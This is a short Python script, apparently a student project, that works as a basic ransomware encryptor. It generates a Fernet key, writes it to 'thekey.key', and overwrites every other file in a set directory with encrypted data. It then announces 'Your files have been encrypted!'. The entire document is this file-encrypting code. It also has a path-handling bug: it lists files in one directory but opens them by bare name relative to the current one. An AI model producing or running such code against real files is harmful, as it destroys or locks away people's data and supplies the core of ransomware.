#!/usr/bin/python3
import os
from cryptography.fernet import Fernet

files = []
path = "/home/student/mycode/finalproject"

# generating a key to be able to unlock files
key = Fernet.generate_key()

for file in os.listdir(path):
    # ignore these files so they don't get encrypted
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    # add files only to the files list; ignore directories
    if os.path.isfile(file):
        files.append(file)

# creating a file called "thekey" and adding the key in the file
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# looping through each file to encrypt
for file in files:
    # opening the files in binary mode to read
    # saving the contents a file in var 'contents'
    with open(file, "rb") as thefile:
        contents = thefile.read()
    # then encrypting the files using Fernet
    encrypted_contents = Fernet(key).encrypt(contents)
    # writing back the encrypted content to the file
    with open(file, "wb") as thefile:
        thefile.write(encrypted_contents)

print("Your files have been encrypted!")